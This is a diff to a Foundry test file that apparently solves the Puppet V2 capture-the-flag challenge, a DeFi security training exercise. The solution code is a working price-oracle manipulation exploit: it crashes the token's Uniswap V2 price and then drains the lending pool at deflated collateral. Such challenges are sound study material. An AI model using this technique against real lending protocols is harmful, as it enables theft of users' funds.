@@ -83,7 +83,7 @@ contract PuppetV2Challenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public view {
+    function test_assertInitialStateV2() public view {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
         assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
@@ -98,7 +98,27 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 1, path, player, block.timestamp * 2);
+
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        uint256 wethBalance = weth.balanceOf(player);
+        if (wethBalance < depositRequired) {
+            uint256 ethNeeded = depositRequired - wethBalance;
+            weth.deposit{value: ethNeeded}();
+        }
+
+        weth.approve(address(lendingPool), depositRequired);
+
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
